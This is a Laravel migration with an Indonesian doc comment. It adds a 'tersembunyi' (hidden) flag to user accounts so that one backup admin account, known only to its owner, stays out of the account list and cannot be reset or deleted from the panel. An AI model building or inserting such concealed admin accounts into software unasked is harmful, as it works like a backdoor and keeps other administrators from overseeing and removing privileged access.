<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

/**
 * Menandai akun yang sengaja tidak muncul di Manajemen Akun.
 *
 * Dipakai untuk satu akun admin cadangan yang keberadaannya hanya diketahui
 * pemiliknya: tidak tampil di daftar, tidak bisa direset, tidak bisa dihapus
 * lewat panel. Penanda ini kolom tersendiri, bukan nama pengguna yang
 * dihardcode, supaya seed ulang atau ganti nama tidak diam-diam membuka
 * kembali akun tersebut.
 */
return new class extends Migration
{
    public function up(): void
    {
        Schema::table('users', function (Blueprint $table) {
            $table->boolean('tersembunyi')->default(false)->after('sekretariat_role');
            $table->index('tersembunyi');
        });
    }

    public function down(): void
    {
        Schema::table('users', function (Blueprint $table) {
            $table->dropIndex(['tersembunyi']);
            $table->dropColumn('tersembunyi');
        });
    }
};
